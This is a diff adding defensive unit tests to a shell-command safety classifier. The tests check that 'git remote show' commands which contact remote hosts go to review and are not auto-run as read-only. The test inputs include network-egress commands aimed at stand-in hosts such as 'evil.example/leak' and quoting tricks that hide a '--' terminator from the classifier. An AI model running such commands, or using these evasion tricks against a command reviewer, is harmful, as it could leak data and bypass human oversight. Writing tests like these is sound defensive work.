@@ -414,6 +414,50 @@ describe('classifyShellCommandSafety', () => {
     expect(await classifyShellCommandSafety(command)).toBe('read-only');
   });
 
+  describe('git remote show network egress (#14359)', () => {
+    // `git remote show` queries the remote (git-upload-pack) unless `-n` is
+    // given, so without that flag it must not auto-run as read-only.
+    it.each([
+      'git remote show origin',
+      'git remote show',
+      'git remote show https://evil.example/leak',
+      'git remote show http://127.0.0.1:8973/leak',
+      'git remote show ssh://evil.example/repo',
+      'git remote show git@evil.example:owner/repo',
+      // A `-n` after the `--` terminator is a positional remote name, not the
+      // no-query flag, so the remote is still queried. The `-n` scan must stay
+      // on the pre-terminator slice; these pin that it does.
+      'git remote show origin -- -n',
+      'git remote show -- -n https://evil.example/leak',
+      // bash removes quotes and backslashes before git runs, so each of these
+      // reaches git as a bare `--` although the argument text still holds them.
+      'git remote show https://evil.example/leak \\-- -n',
+      'git remote show https://evil.example/leak \\-\\- -n',
+      'git remote show origin ""-- -n',
+      'git remote show origin --"" -n',
+      "git remote show origin ''-- -n",
+      "git remote show origin '-'- -n",
+      "git remote show origin $'--' -n",
+    ])('routes %j to review instead of auto-running it', async (command) => {
+      expect(await classifyShellCommandSafety(command)).toBe('unknown');
+      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
+    });
+
+    it.each([
+      'git remote show -n origin',
+      'git remote show -n https://evil.example/leak',
+      // `-n` is honoured at any position before `--`, so a trailing `-n`
+      // suppresses the query just as a leading one does; pin that a later
+      // leading-options-only scan cannot silently narrow it.
+      'git remote show origin -n',
+      'git remote show https://evil.example/leak -n',
+      'git remote show -n "origin"',
+      'git remote get-url origin',
+    ])('keeps %j read-only', async (command) => {
+      expect(await classifyShellCommandSafety(command)).toBe('read-only');
+    });
+  });
+
   it.each([
     ...'chgrp chmod chown cp install ln mkdir mkfifo mknod mv rename rm rmdir shred touch truncate unlink'
       .split(' ')
@@ -1006,6 +1050,8 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     ['git branch -d feature', false],
     ['git remote -v', true],
     ['git remote add origin url', false],
+    ['git remote show origin \\-- -n', false, 'escaped terminator'],
+    ["git remote show origin ''-- -n", false, 'quoted terminator'],
     ['git --version', true],
 
     // --- find ---
